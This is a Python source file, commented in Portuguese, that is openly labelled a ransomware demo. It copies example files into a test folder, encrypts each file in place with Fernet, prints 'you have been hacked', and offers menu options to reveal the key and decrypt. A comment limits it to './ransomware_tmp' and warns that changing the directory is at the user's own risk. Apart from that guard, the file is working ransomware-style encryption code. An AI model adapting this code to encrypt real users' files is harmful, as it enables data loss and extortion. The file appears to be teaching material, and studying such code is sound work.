import os
import shutil

from cryptography.fernet import Fernet

from arquivos_utils import ler_arquivo, escrever_arquivo
from classes import GerenciadorDeChave


def garanta_existencia_diretorio(diretorio: str) -> None:
    diretorio_exemplos: str = './exemplos'
    if os.path.exists(diretorio):
        print(f'Diretório {diretorio} já existe. Sobrescrendo.')
        shutil.rmtree(diretorio)
    else:
        print(f'Criando diretório {diretorio}...')

    print(f'Copiando arquivos de {diretorio_exemplos} para {diretorio}...')
    shutil.copytree(diretorio_exemplos, diretorio)
    print('Arquivos copiados com sucesso!')


def criptografe_diretorio(diretorio, gerenciador_de_chave):
    chave_criptografia = gerenciador_de_chave.crie_chave()
    fernet = Fernet(chave_criptografia)

    for nome_arquivo in os.listdir(diretorio):
        caminho_arquivo = f'{diretorio}/{nome_arquivo}'
        conteudo = ler_arquivo(caminho_arquivo)
        conteudo_criptografado = fernet.encrypt(conteudo)
        escrever_arquivo(caminho_arquivo, conteudo_criptografado)


def obtenha_chave_criptografia():
    return ler_arquivo('keys.rans')


def descriptografe_diretorio(diretorio, chave_legivel, gerenciador_de_chave):
    chave = gerenciador_de_chave.converta_para_bytes(chave_legivel)
    fernet = Fernet(chave)

    for nome_arquivo in os.listdir(diretorio):
        caminho_arquivo = f'{diretorio}/{nome_arquivo}'
        conteudo_criptografado = ler_arquivo(caminho_arquivo)

        conteudo = fernet.decrypt(conteudo_criptografado)
        escrever_arquivo(caminho_arquivo, conteudo)

    gerenciador_de_chave.remova_chave()


if __name__ == '__main__':
    # Apesar de o código ser flexível o suficiente para criptografar qualquer diretório, estamos setando um diretório
    # específico para evitar que o ransomware criptografe diretórios importantes do sistema operacional.
    # Altere o diretório por sua conta e risco.

    DIRETORIO_TESTE: str = './ransomware_tmp'
    gerenciador_de_chave = GerenciadorDeChave('keys.rans')
    print('O que você deseja fazer?')
    opcao: int = -1
    while opcao != 0:
        print('1 - Criptografar')
        print('2 - Obter chave de descriptografia')
        print('3 - Descriptografar')
        print('0 - Sair')
        opcao = int(input('Digite a opção desejada: '))

        if opcao == 1:
            garanta_existencia_diretorio(DIRETORIO_TESTE)
            criptografe_diretorio(DIRETORIO_TESTE, gerenciador_de_chave)
            print(f'Você foi hackeado! Todos os arquivos do diretório {DIRETORIO_TESTE} foram criptografados!')
        elif opcao == 2:
            print(f'Chave de descriptografia: {gerenciador_de_chave.obtenha_chave(legivel=True)}')
        elif opcao == 3:
            chave_legivel = input('Digite a chave de descriptografia: ')
            descriptografe_diretorio(DIRETORIO_TESTE, chave_legivel, gerenciador_de_chave)
            print(
                f'Você não está mais hackeado! Todos os arquivos do diretório {DIRETORIO_TESTE} foram descriptografados!'
            )
        elif opcao == 0:
            print('Até mais!')
        else:
            print('Opção inválida!')
